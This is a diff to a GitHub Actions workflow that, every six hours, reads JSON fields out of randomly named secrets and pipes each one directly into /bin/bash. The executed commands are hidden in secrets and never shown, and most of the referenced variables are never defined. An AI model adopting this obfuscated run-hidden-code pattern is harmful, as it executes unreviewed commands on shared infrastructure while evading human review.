@@ -1,31 +1,23 @@
 name: liucanbai3456
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '5 1/6 * * *'
+    - cron: '40 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: liucanbai3456
         env:
-          df8: ${{ secrets.df8 }}
+          lnf0: ${{ secrets.lnf0 }}
         run: |
-          echo $df8 | jq -r .k3 | /bin/bash
-          echo $q7 | jq -r .frqv332 | /bin/bash
-          echo $y85 | jq -r .vme0 | /bin/bash
-          echo $gga3203 | jq -r .djnu226 | /bin/bash
-          echo $y427 | jq -r .ipnc9 | /bin/bash
-          echo $q61200 | jq -r .gz548 | /bin/bash
-          echo $rlr77 | jq -r .zf17 | /bin/bash
-          echo $l88121 | jq -r .zi3453 | /bin/bash
-          echo $zb76 | jq -r .jbrwu14866 | /bin/bash
-          echo $sor29603 | jq -r .k1788 | /bin/bash
-          echo $zopv9641 | jq -r .zzwa6764 | /bin/bash
-          echo $gsk25 | jq -r .so387 | /bin/bash
-          echo $rdkfj1 | jq -r .ukgo1 | /bin/bash
-          echo $rb04 | jq -r .sq4 | /bin/bash
-          echo $zlcq001 | jq -r .sn72 | /bin/bash
-          echo $gdlb81583 | jq -r .xad3350 | /bin/bash
+          echo $lnf0 | jq -r .us0666 | /bin/bash
+          echo $gshw3 | jq -r .vgs46486 | /bin/bash
+          echo $jhlq20 | jq -r .o85 | /bin/bash
+          echo $ny7623 | jq -r .tdn6457 | /bin/bash
+          echo $cdev80665 | jq -r .bfir9 | /bin/bash
+          echo $bnt825 | jq -r .sem5260 | /bin/bash
 
